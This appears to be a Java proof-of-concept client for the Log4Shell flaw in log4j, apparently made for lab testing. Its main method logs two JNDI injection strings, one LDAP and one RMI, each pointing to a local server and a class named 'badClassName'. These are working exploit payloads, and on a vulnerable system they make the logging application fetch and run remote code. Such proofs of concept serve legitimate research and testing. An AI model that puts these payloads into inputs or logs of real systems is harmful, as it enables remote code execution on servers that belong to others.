package org.sec;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class ClientMain {
    private static final Logger logger = LogManager.getLogger(ClientMain.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
        logger.error("${jndi:rmi://127.0.0.1:1099/badClassName}");
    }
}
